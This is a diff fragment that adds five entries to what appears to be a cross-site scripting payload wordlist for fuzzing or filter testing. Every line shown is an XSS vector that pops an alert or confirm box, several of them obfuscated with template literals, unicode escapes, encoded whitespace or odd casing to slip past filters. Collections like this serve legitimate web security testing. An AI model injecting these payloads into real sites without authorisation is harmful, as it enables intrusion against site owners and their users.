@@ -2,6 +2,11 @@
 1'"--><A HRef AutoFocus OnFocus=alert(1)//>
 1</Script><Script>1/*'/*\'/**//alert(1)//
 toString=\u0061lert;windows+''
+('/alert?.(7)/')
+'/alert?.(7)/'
+${alert`XSS`}
+'-(a=window.alert,http://a.call(this,"BOO"))-'
+-(a=window.alert,http://a.call(this,"BOO"))-
 "><deTAIls/+/oNTogGLE%0A=%0Aconfirm()%0Dx>
 #&lt;img/src/onerror=alert(1)&gt;
 1"Onxx=><Svg/Onload=alert(1)//
